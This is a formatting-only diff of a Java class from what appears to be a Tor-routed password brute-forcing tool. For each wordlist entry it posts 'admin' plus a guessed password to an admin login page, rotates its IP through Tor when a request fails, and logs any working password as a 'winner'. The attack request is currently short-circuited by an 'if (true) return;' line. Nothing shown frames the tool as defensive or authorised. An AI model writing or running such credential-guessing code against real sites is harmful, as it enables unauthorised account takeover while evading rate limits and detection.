@@ -17,15 +17,17 @@ public class WordlistConsumerWorker extends TorWorker
 {
     public int threadCounter = 0;
     WordlistConsumerWorkerManager manager;
+
     public WordlistConsumerWorker(ProxyWorkerManager manager, final int id)
     {
         super(manager, id);
-        this.manager = (WordlistConsumerWorkerManager)manager;
+        this.manager = (WordlistConsumerWorkerManager) manager;
 
     }
+
     public void process(String entry)
     {
-        System.out.println("Entry: "+entry);
+        System.out.println("Entry: " + entry);
         try
         {
             Thread.sleep(500);
@@ -34,9 +36,12 @@ public class WordlistConsumerWorker extends TorWorker
         {
             e.printStackTrace();
         }
-        if (true) {return; }
-        String page = TorRangeHttpHelper.postRequest("https://ccffdd/admin/login.php","username=admin&password="+entry+"&Submit=Login",getProxy() , false,"");
-        if (page == null )
+        if (true)
+        {
+            return;
+        }
+        String page = TorRangeHttpHelper.postRequest("https://ccffdd/admin/login.php", "username=admin&password=" + entry + "&Submit=Login", getProxy(), false, "");
+        if (page == null)
         {
             changeIp();
             process(entry);
@@ -67,7 +72,7 @@ public class WordlistConsumerWorker extends TorWorker
     {
         try
         {
-            System.out.println("We have a winner: "+entry);
+            System.out.println("We have a winner: " + entry);
             manager.logWinner(page, entry);
             System.exit(0);
         }
